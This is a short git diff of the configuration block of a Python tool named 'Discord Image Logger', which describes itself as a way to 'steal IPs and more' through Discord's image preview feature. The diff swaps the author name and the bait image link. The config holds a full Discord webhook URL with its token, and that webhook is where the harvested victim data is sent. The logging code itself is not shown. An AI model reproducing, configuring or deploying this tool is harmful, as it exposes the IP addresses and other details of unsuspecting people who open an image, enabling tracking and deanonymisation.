@@ -8,12 +8,12 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "ACE"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1348119975251939329/vYx2IjMRhMrJGJ5IthG5LWrq4YZrgPTeLa2Y_TnmCdXZpof1zdc7Fmph5LrIG2jNuBmg",
-    "image": "  https://i.pinimg.com/736x/d7/ea/5d/d7ea5d4915a5b43042c3df7e1bb5fe26.jpg  ", # You can also have a custom image by using a URL argument
+    "image": "  https://i.pinimg.com/736x/22/a9/ce/22a9cea52d1486afc05ded6aaa1259c8.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
